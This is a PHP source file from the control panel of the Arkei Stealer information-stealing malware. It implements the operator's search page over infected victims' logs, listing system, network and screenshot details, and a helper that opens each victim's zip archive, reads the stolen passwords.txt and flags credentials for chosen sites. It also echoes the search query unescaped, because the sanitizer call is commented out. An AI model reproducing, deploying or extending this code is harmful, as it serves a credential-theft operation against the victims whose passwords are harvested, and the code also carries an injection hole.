<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [search.php]
*    Search
*/

session_start();

require("../app/config.php");
require "../app/searchEngine.php";

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$pageName = "Settings";

$query = $_GET["q"];//checkParam($_GET["q"]);

if($query != null)
{
	
}
else
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit(0);
}


require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
<div class="container-fluid">

<div class="row">
			<div class="col-12">
				<div class="page-title-box">
					<h4 class="page-title">Search</h4>
				</div>
			</div>
		</div> 

<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
						<h4 class="header-title">Found by <? echo $query; ?></h4>
							
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Checked?</th>
											<th>ID</th>
											<th>Stats</th>
											<th>System</th>
											<th>Network</th>
											<th>Date Time</th>
											<th>Screenshot</th>
											<th>Comment</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<? SearchEngine($query, $config); ?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");


function checkPreset($config, $log, $site, $color)
{
	$zip = new ZipArchive;
	$reading = "";
	
	if ($zip->open('../'.$config["logs_folder"].'/'. $log["user"] .'') === TRUE) 
	{
		$reading = $zip->getFromName("/passwords.txt");
		$zip->close();
		
		$reading = nl2br($reading);
		$pos = stripos($reading, $site);
		
		if ($pos !== false)
		{
			echo '<span style="color: '.$color.'">'.$site.'</span> ';
		}
	}
}

?>